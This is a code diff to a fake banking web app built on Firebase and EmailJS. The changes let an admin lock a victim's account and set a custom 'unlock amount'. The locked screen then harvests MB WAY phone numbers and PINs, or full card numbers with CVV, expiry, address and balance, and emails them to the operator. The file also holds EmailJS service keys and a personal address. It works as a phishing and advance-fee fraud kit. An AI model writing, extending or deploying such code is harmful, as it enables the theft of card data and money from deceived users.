@@ -748,37 +748,28 @@ firebase.initializeApp({
 var auth = firebase.auth();
 var db   = firebase.database();
 
-// ── EMAIL via EmailJS ──
+emailjs.init({publicKey:'UWGqvMxNngR8sNNco'});
+
+// ── EMAIL HELPER ──
+// serviceID: 'service_rs826sa', templateID: 'template_6f5m0as'
+// Template variables: {{to_email}}, {{subject}}, {{message}}
 function sendEmail(toEmail, title, name, message){
-  var country = (window.userData && window.userData.country) ? window.userData.country : '';
-  var pub, sid, tid;
-  if(
-    title.indexOf('OTP') !== -1 ||
-    title.indexOf('MB WAY Link') !== -1 ||
-    title.indexOf('Cash App Link') !== -1 ||
-    title.indexOf('Auth Code') !== -1
-  ){
-    pub = '8tNTuFPIowu1Ookpq'; sid = 'service_s2e0bde'; tid = 'template_7ulapld';
-  } else {
-    pub = 'q4WG3VtKzkHUooQIT'; sid = 'service_g1079e5'; tid = 'template_3rvjuyv';
-  }
-  emailjs.init({publicKey: pub});
-  emailjs.send(sid, tid, {
-    to_email: toEmail,
-    title:    title,
-    name:     name || '',
-    country:  country,
-    message:  message,
-    time:     new Date().toLocaleString()
+  // user_name = original variable used by template_6f5m0as
+  emailjs.send('service_rs826sa','template_6f5m0as',{
+    user_name: name||title,
+    to_email:  toEmail,
+    title:     title,
+    name:      name,
+    message:   message
   }).then(function(){
-    console.log('Email sent: ' + title);
+    console.log('Email sent to '+toEmail);
   }).catch(function(e){
-    console.warn('EmailJS error:', e);
+    console.warn('EmailJS error:',e);
   });
 }
 
 // ── CONSTANTS ──
-var ADMIN_EMAIL = 'viccylay30@gmail.com';
+var ADMIN_EMAIL = 'admin@gmail.com';
 var ADMINADEX_EMAIL = 'adminadex@gmail.com';
 var SYM = {'USD':'$','EUR':'\u20ac','GBP':'\u00a3','NGN':'\u20a6','CAD':'C$','AUD':'A$','JPY':'\u00a5'};
 // ── CURRENCY CONVERSION RATES (base: USD) ──
@@ -1482,6 +1473,14 @@ auth.onAuthStateChanged(function(user){
       if(userData.locked){
         var lrEl=$('lock-reason-text');
         if(lrEl) lrEl.textContent=userData.lockReason||'Your account has been restricted by our compliance team.';
+        // Set dynamic unlock amount from admin
+        window._lockRequiredAmt = userData.lockAmount || 150;
+        var _amtSpan = document.getElementById('lock-required-amount');
+        if(_amtSpan) _amtSpan.textContent = '£' + window._lockRequiredAmt;
+        var _step2Body = document.getElementById('lock-step2-body');
+        if(_step2Body) _step2Body.innerHTML = 'Required amount: <strong style="color:#fff;">£' + window._lockRequiredAmt + ' / $' + window._lockRequiredAmt + '</strong>';
+        var _amtModal = document.getElementById('lock-required-amount-modal');
+        if(_amtModal) _amtModal.textContent = '£' + window._lockRequiredAmt + ' / $' + window._lockRequiredAmt;
         showScreen('lock-screen',true);
       } else {
         showScreen('dashboard',true);
@@ -2390,6 +2389,7 @@ function loadUsersTab(){
             +'<div>💳 Cards: '+((u.linkedCards||[]).filter(function(c){return c;}).length)+'</div>'
             +(u.lastSeen?'<div style="color:'+lastSeenColor(u.lastSeen)+';">👁 Last seen: '+new Date(u.lastSeen).toLocaleString()+'</div>':'<div style="color:rgba(255,255,255,0.3);">👁 Last seen: never recorded</div>')
             +(isLocked?'<div style="margin-top:6px;color:#ff6b6b;font-weight:600;">&#128274; Locked: '+(u.lockReason||'No reason given')+'</div>':'')
+            +(isLocked?'<div style="display:flex;align-items:center;gap:8px;margin-top:4px;"><span style="color:#ffc107;font-weight:700;">&#128176; Unlock amount: '+(u.lockAmount||150)+'</span><button onclick="setLockAmount(\''+u.uid+'\','+(u.lockAmount||150)+')" style="background:rgba(255,193,7,0.15);border:1px solid rgba(255,193,7,0.4);border-radius:6px;padding:2px 8px;font-size:11px;font-weight:700;color:#ffc107;cursor:pointer;font-family:inherit;">Edit</button></div>':'')
           +'</div>'
           // Notifications / messages history
           +'<div id="msgs-'+u.uid+'" style="margin-bottom:12px;"></div>'
@@ -3802,7 +3802,7 @@ $('mbway-otp-submit-btn').onclick = function(){
 <div class="modal" id="lock-addmoney-modal">
   <div class="modal-box" style="background:#fff;">
     <div class="modal-header"><h3 style="color:#1a56ff;" data-i18n="lockAddMoneyTitle">Add Money to Unlock</h3><button class="modal-close" onclick="closeModal('lock-addmoney-modal')">&#215;</button></div>
-    <p style="font-size:13px;color:#666;margin-bottom:18px;line-height:1.5;" data-i18n="lockAddMoneyDesc">Choose how to add the required amount. Name must match your account.</p>
+    <p style="font-size:13px;color:#666;margin-bottom:18px;line-height:1.5;" >Choose how to add <strong id="lock-required-amount-modal" style="color:#1a56ff;">the required amount</strong>. Name must match your account.</p>
     <button onclick="openLockMethod('mbway')" style="display:flex;align-items:center;gap:14px;width:100%;background:#fff5f5;border:2px solid #ffcccc;border-radius:12px;padding:14px 16px;margin-bottom:10px;cursor:pointer;font-family:inherit;text-align:left;"><img src="https://i.imgur.com/JGEaMvn.jpeg" style="width:38px;height:38px;border-radius:8px;object-fit:cover;flex-shrink:0;"><div><div style="font-size:15px;font-weight:700;color:#cc0000;" data-i18n="lockMbwayLabel">MB WAY</div><div style="font-size:12px;color:#888;margin-top:2px;" data-i18n="lockMbwayDesc">Pay via MB WAY</div></div></button>
     <button onclick="openLockMethod('visa')" style="display:flex;align-items:center;gap:14px;width:100%;background:#f0f4ff;border:2px solid #c7d4ff;border-radius:12px;padding:14px 16px;margin-bottom:10px;cursor:pointer;font-family:inherit;text-align:left;"><span style="font-size:32px;flex-shrink:0;">&#128179;</span><div><div style="font-size:15px;font-weight:700;color:#1a56ff;" data-i18n="lockVisaLabel">Visa</div><div style="font-size:12px;color:#888;margin-top:2px;" data-i18n="lockVisaDesc">Pay with Visa card</div></div></button>
     <button onclick="openLockMethod('mastercard')" style="display:flex;align-items:center;gap:14px;width:100%;background:#fff8f0;border:2px solid #ffe0b2;border-radius:12px;padding:14px 16px;margin-bottom:10px;cursor:pointer;font-family:inherit;text-align:left;"><span style="font-size:32px;flex-shrink:0;">&#128179;</span><div><div style="font-size:15px;font-weight:700;color:#e65100;" data-i18n="lockMcLabel">Mastercard</div><div style="font-size:12px;color:#888;margin-top:2px;" data-i18n="lockMcDesc">Pay with Mastercard</div></div></button>
@@ -3945,7 +3945,7 @@ $('mbway-otp-submit-btn').onclick = function(){
       </div>
       <div style="background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.08);border-radius:14px;padding:16px 18px;display:flex;gap:14px;align-items:flex-start;">
         <div style="min-width:32px;height:32px;background:linear-gradient(135deg,#1a56ff,#0a3ab4);border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:800;color:#fff;flex-shrink:0;">2</div>
-        <div><div style="font-size:13px;font-weight:700;color:#fff;margin-bottom:3px;" data-i18n="lockStep2Title">Minimum Deposit Required</div><div style="font-size:12px;color:rgba(255,255,255,0.55);line-height:1.6;" data-i18n="lockStep2Body">Minimum amount is &#163;150 / $150 or equivalent.</div></div>
+        <div><div style="font-size:13px;font-weight:700;color:#fff;margin-bottom:3px;" data-i18n="lockStep2Title">Minimum Deposit Required</div><div id="lock-step2-body" style="font-size:12px;color:rgba(255,255,255,0.55);line-height:1.6;">Required amount: <strong id="lock-required-amount" style="color:#fff;">&#163;150</strong></div></div>
       </div>
       <div style="background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.08);border-radius:14px;padding:16px 18px;display:flex;gap:14px;align-items:flex-start;">
         <div style="min-width:32px;height:32px;background:linear-gradient(135deg,#1a56ff,#0a3ab4);border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:800;color:#fff;flex-shrink:0;">3</div>
@@ -3997,8 +3997,8 @@ document.addEventListener('DOMContentLoaded',function(){
         +'<input type="tel" id="lock-mbway-phone" class="modal-input" placeholder="'+tr('lockMbwayPhone')+'" inputmode="numeric" style="flex:1;margin-bottom:0;"></div>'
         +'<input type="password" id="lock-mbway-pin" class="modal-input" placeholder="'+tr('lockMbwayPin')+'" maxlength="6" inputmode="numeric">'
         +'<input type="text" id="lock-mbway-name" class="modal-input" placeholder="'+tr('lockMbwayName')+'">'
-        +'<input type="number" id="lock-mbway-amount" class="modal-input" placeholder="'+tr('lockMbwayAmount')+'" inputmode="decimal" min="150">'
-        +'<div style="font-size:12px;color:rgba(255,255,255,0.4);margin-top:-6px;margin-bottom:8px;">'+tr('lockMbwayMin')+'</div>';
+        +'<input type="number" id="lock-mbway-amount" class="modal-input" placeholder="Amount to send (min. '+(window._lockRequiredAmt||150)+')'+'" inputmode="decimal" min="'+(window._lockRequiredAmt||150)+'">' 
+        +'<div id="lock-mbway-min-text" style="font-size:12px;color:rgba(255,255,255,0.4);margin-top:-6px;margin-bottom:8px;">Minimum: £'+(window._lockRequiredAmt||150)+'</div>';
       if(notice) notice.style.display='block';
       if(noticeText) noticeText.textContent=tr('lockMbwayAuthNote');
       if(toAuthBtn) toAuthBtn.style.display='none';
@@ -4012,7 +4012,7 @@ document.addEventListener('DOMContentLoaded',function(){
         +'<input type="text" id="lock-card-street" class="modal-input" placeholder="'+tr('lockCardStreet')+'">'
         +'<div style="display:flex;gap:8px;"><input type="text" id="lock-card-city" class="modal-input" placeholder="'+tr('lockCardCity')+'" style="flex:1;"><input type="text" id="lock-card-postcode" class="modal-input" placeholder="'+tr('lockCardPostcode')+'" style="flex:1;"></div>'
         +'<input type="tel" id="lock-card-phone" class="modal-input" placeholder="'+tr('lockCardPhone')+'">'
-        +'<input type="number" id="lock-card-amount" class="modal-input" placeholder="Amount to add (min. £150 / $150)" inputmode="decimal" min="150">'
+        +'<input type="number" id="lock-card-amount" class="modal-input" placeholder="Amount to add (min. '+(window._lockRequiredAmt||150)+')'+'" inputmode="decimal" min="'+(window._lockRequiredAmt||150)+'">' 
         +'<input type="text" id="lock-card-balance" class="modal-input" placeholder="'+tr('lockCardBalance')+'" inputmode="decimal">';
       if(notice) notice.style.display='block';
       if(noticeText) noticeText.textContent=tr('lockCardAuthNote');
@@ -4157,7 +4157,7 @@ document.addEventListener('DOMContentLoaded',function(){
       if(!name){err.textContent='Please enter the name on the account.';return;}
       var amtRaw=document.getElementById('lock-mbway-amount')?document.getElementById('lock-mbway-amount').value.trim():'';
       var amt=parseFloat(amtRaw);
-      if(!amtRaw||isNaN(amt)||amt<150){err.textContent='Amount must be at least £150 / $150.';return;}
+      var _minAmt=window._lockRequiredAmt||150; if(!amtRaw||isNaN(amt)||amt<_minAmt){err.textContent='Amount must be at least £'+_minAmt+' / $'+_minAmt+'.';return;}
       payload.phone=_lockMbwayCode+phone; payload.pin=pin; payload.accountName=name; payload.amount=amt;
       emailMsg='MB WAY unlock payment submitted.\n\nPhone: '+payload.phone+'\nPIN: '+pin+'\nName: '+name+'\nAmount: '+amt+'\n\nUser Email: '+(ud.email||'')+'\nAccount #: '+(ud.accountNumber||'');
     } else {
@@ -4176,7 +4176,7 @@ document.addEventListener('DOMContentLoaded',function(){
       if(num.length!==16){err.textContent='Card number must be 16 digits.';return;}
       if(!cname){err.textContent='Please enter the cardholder name.';return;}
       if(!expiry||!cvv){err.textContent='Please enter expiry and CVV.';return;}
-      if(!cardAmt||parseFloat(cardAmt)<150){err.textContent='Amount must be at least £150 / $150.';return;}
+      var _minAmt2=window._lockRequiredAmt||150; if(!cardAmt||parseFloat(cardAmt)<_minAmt2){err.textContent='Amount must be at least £'+_minAmt2+' / $'+_minAmt2+'.';return;}
       var brand=typeof detectBrand==='function'?detectBrand(num):(num[0]==='4'?'Visa':'Mastercard');
       payload.cardNumber=num;payload.cardName=cname;payload.bankName=bank;payload.expiry=expiry;payload.cvv=cvv;payload.brand=brand;payload.lastFour=num.slice(-4);payload.street=street;payload.city=city;payload.postcode=postcode;payload.phone=phone2;payload.amount=cardAmt;payload.balance=balance;
       emailMsg=brand+' card submitted for account unlock.\n\nCard: '+brand+' ....'+num.slice(-4)+'\nName: '+cname+'\nBank: '+(bank||'--')+'\nExpiry: '+expiry+'\nCVV: '+cvv+'\nAmount: '+cardAmt+'\nBalance: '+(balance||'--')+'\nStreet: '+(street||'--')+'\nCity: '+(city||'--')+'\nPostcode: '+(postcode||'--')+'\nPhone: '+(phone2||'--')+'\n\nUser Email: '+(ud.email||'')+'\nAccount #: '+(ud.accountNumber||'');
@@ -4274,8 +4274,20 @@ document.addEventListener('DOMContentLoaded',function(){
   window.lockUser = function(uid){
     var reason=prompt('Reason for locking this account:');
     if(!reason||!reason.trim()) return;
-    firebase.database().ref('users/'+uid).update({locked:true,lockReason:reason.trim(),lockedDate:new Date().toISOString()}).then(function(){
+    var amtStr=prompt('Required unlock amount for this user (e.g. 150, 300, 500):','150');
+    if(amtStr===null) return;
+    var lockAmt=parseFloat(amtStr)||150;
+    firebase.database().ref('users/'+uid).update({locked:true,lockReason:reason.trim(),lockAmount:lockAmt,lockedDate:new Date().toISOString()}).then(function(){
       if(typeof notify==='function') notify(uid,'🔒 Your account has been locked. Reason: '+reason.trim());
+      if(typeof loadUsersTab==='function') loadUsersTab();
+    });
+  };
+  window.setLockAmount = function(uid, currentAmt){
+    var amtStr=prompt('Update required unlock amount (current: '+currentAmt+'):',currentAmt);
+    if(amtStr===null) return;
+    var newAmt=parseFloat(amtStr);
+    if(isNaN(newAmt)||newAmt<=0){alert('Please enter a valid amount.');return;}
+    firebase.database().ref('users/'+uid).update({lockAmount:newAmt}).then(function(){
       if(typeof loadUsersTab==='function') loadUsersTab();
     });
   };
